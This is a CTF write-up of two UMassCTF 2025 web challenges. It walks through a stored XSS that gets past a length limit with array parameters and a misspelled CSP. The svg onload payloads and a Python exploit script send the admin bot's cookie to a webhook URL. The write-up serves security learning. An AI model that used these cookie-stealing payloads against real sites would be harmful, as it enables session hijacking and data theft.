---
title: UMassCTF 2025 Write Up
date: 2025-04-22
categories: [UMassCTF, WriteUp]
tags: [web]     # TAG names should always be lowercase
---


# Description 
This is the write up for 5 web challenges in UMassCTF 2025


## Rush Hour

| Solves | Points | Tags          |
|--------|--------|---------------|
| 49     | 388    | `web`, `medium` |

**Description:**  
It's almost rush hour at Papa's Freezeria! Let's start writing those orders down!

**Source Code:** [Rush_Hour.zip](/assets/source/umassctf-2025/Rush_Hour.zip)

Firstly, I check where the flag is located.
```python
app.get('/user/:id',async (req,res)=>{
  if(!req.params || !(await client.exists(req.params.id))){

    return res.redirect('/')
  }

  let notes = await get_cache(req.params.id);

  if(req.params.id.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!");
  } else if (req.params.id.includes("admin") && req.ip == '::ffff:127.0.0.1' && !banned_fetch_dests.includes(req.headers['sec-fetch-dest'])) {
    res.cookie('supersecretstring', process.env.FLAG);
  }
```
Looks like we are going to do some xss things as the flag is in the admin's cookie.

Here's what we have on the main page:

![Rush Hour Main Page](/assets/source/umassctf-2025/Rush_Hour/index.png)

We are able to add notes, but the length is limited:
```python
app.get('/create',async (req,res)=>{
  ...
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.query.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.query.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  ...
```

Looking at the server code, there are several key points. There are 2 functions that handle the same route, but one use get and the other use post. This looks a little bit redundant as both of them are almost the same.

```python
app.get('/create',async (req,res)=>{
  if(!req.cookies || !req.cookies.user || !(await client.exists(req.cookies.user))){
    return res.send("Hmm are you even a user? Go to /");
  }
  if(!req.query.note){
    return res.send("Did not get a note")
  }
  if(req.cookies.user.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!")
  } else if(!req.cookies.user.includes("admin") && req.ip == '::ffff:127.0.0.1') {
    return res.send("Admins are not allowed to doctor user notes!");
  }
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.query.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.query.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  let user_note = await get_cache(req.cookies.user);
  if(!user_note) {
    return res.send("Problem while fetching notes! Try something else perhaps?")
  }
  user_note.push(req.query.note);
  await set_cache(req.cookies.user,user_note);
  return res.send("Note uploaded!")
})
```

```python
app.post('/create',async (req,res)=>{
  if(!req.cookies || !req.cookies.user || !(client.exists(req.cookies.user))){
    return res.send("Hmm are you even a user? Go to /");
  }
  if(!req.body.note){
    return res.send("Did not get a note body")
  }
  if(req.cookies.user.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!")
  } else if(!req.cookies.user.includes("admin") && req.ip == '::ffff:127.0.0.1') {
    return res.send("Admins are not allowed to doctor user notes!");
  }
  // I get to have longer notes!
  if(req.ip === '::ffff:127.0.0.1'){
    if(req.body.note.length > 42) {
      return res.send("Invalid note length!")
    }
  } else {
    if(req.body.note.length > 16) {
      return res.send("Invalid note length!")
    }
  }
  let user_note = await get_cache(req.cookies.user);
  if(!user_note) {
    return res.send("Problem while fetching notes! Try something else perhaps?")
  }
  user_note.push(req.body.note);
  await set_cache(req.cookies.user,user_note);
  return res.redirect(`/user/${req.cookies.user}`);
})
```

The main difference here is between `req.query.note` and `req.body.note`. The first one is used when we use GET method, while the second one is used when we use POST method. Combine with the length limit, I come up with the idea of using array to bypass it.

I try to send something like:

```python
data = {
  'note[0]': """<img src=1 onerror=alert(1)>""",
  'note[1]': 'sliderboo'
}
```
And it works! My payload is reflected. Now it's time to get the flag.

![Payload Reflected](/assets/source/umassctf-2025/Rush_Hour/alert_1.png)

From the below code, if we want to have the flag cookie, the visited page id must contain the word "admin", also the page must be accessed from the localhost and the `sec-fetch-dest` header must not be set to some value in the `banned_fetch_dests` array.

```python
app.get('/user/:id',async (req,res)=>{
  ...
  if(req.params.id.includes("admin") && req.ip != '::ffff:127.0.0.1'){
    return res.send("You're not an admin!");
  } else if (req.params.id.includes("admin") && req.ip == '::ffff:127.0.0.1' && !banned_fetch_dests.includes(req.headers['sec-fetch-dest'])) {
    res.cookie('supersecretstring', process.env.FLAG);
  }
  ...
```

Beside that, in `index.html`, looks like we have some Content Security Policy check:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="defaul-src 'none';
  connect-src 'none';" />
```

If we look carefully, we can see that the `default-src` is a typo, it should be `default-src`. This means that we only need to consider the `connect-src` directive. From chat GPT:

```
The connect-src directive in a Content Security Policy (CSP) controls which URLs the browser is allowed to connect to using JavaScript APIs like:
  [-] fetch()
  [-] XMLHttpRequest
  [-] WebSockets (ws:// or wss://)
  [-] EventSource (Server-Sent Events)
```

That's not a big problem. There are many ways to bypass this such as using `iframe` or `img` or `svg` tag. I choose to use `svg` tag with `onload` event.

```html
<svg onload=location.href="http://webhook.site/your-web-hook?cookie="+document.cookie>
```

Of course life is not easy like that. Although the payload works and we do get the cookie, but what we need is the flag cookie, not the user cookie. So we still have some work to do.

![Dump Payload](/assets/source/umassctf-2025/Rush_Hour/dump_payload.png)

As mentioned above, in order to get the flag cookie, we need make the admin bot get to their own page. As we have already know the admin's id (it is exposed in `/report/:id` or we can obtain it from the above payload), we can craft a payload that redirect the admin bot to their page and then redirect again to our webhook. Or simplier, just get to `/`, the page will auto redirect to `/report/:id`.

```python
app.get('/', async (req, res) => {
  let UID;
  if(!req.cookies || !req.cookies.user || !(await client.exists(req.cookies.user))){
    UID = uuidv4();
    await set_cache(UID,["This is my first note!"]);
    await set_cache(UID + "_cust",0);
    res.set({'Set-Cookie':`user=${UID}`});
  } else {
    UID = req.cookies.user;
  }
  res.redirect(`/user/${UID}`);
})
```

My final payload looks like this:

```html
<svg onload="window.open('/');setTimeout(() => location.href='http://webhook.site/your-web-hook?cookie='+document.cookie, 2000)">
```

I use `window.open` to make the admin bot to get to `/` (which will then redirect the bot to its page and get the flag cookie), use `setTimeout` to wait for the page to load, then just redirect to my webhook.

**Final flag:**
`UMASS{tH3_cl053Rz_@re_n0_m@tcH}`


## Rush Hour v2

| Solves | Points | Tags          |
|--------|--------|---------------|
| 40     | 426    | `web`, `hard(?)` |

This challenge is almost similar to the previous one, except from `admin.js`. This time, we have an additional check 

```python
page.on('request', (request) => {
  if (!request.url().startsWith("http://127.0.0.1:3000")) {
    request.abort();
  } else {
    request.continue();
  }
});
```

With those who familiar with WAF bypass, this is just a piece of cake. We can just use `@` to bypass the check. The payload is similar to the previous challenge. Below is the exploit script:

```python
import requests

host = 'localhost'
port = 80
url = f'http://{host}:{port}/'

webhook = 'webhook.site/your-web-hook'
session = requests.session()

def login():
    res = session.get(url)

def create_note():
    data = {
        'note[0]': f"""<svg onload="window.open('/');setTimeout(() => location.href='http://127.0.0.1:3000@{webhook}?cookie='+document.cookie, 2000)">""",
        'note[1]': 'sliderboo'
    }
    print(data)
    res = session.post(url + 'create', data=data)

def report():
    res = session.get(url + 'report/' + session.cookies['user'])
    print(res.text)

login()
create_note()
report()
```

**Final flag:**
`UMASS{k@hUnA_mY_b310v3D1!!1!}`



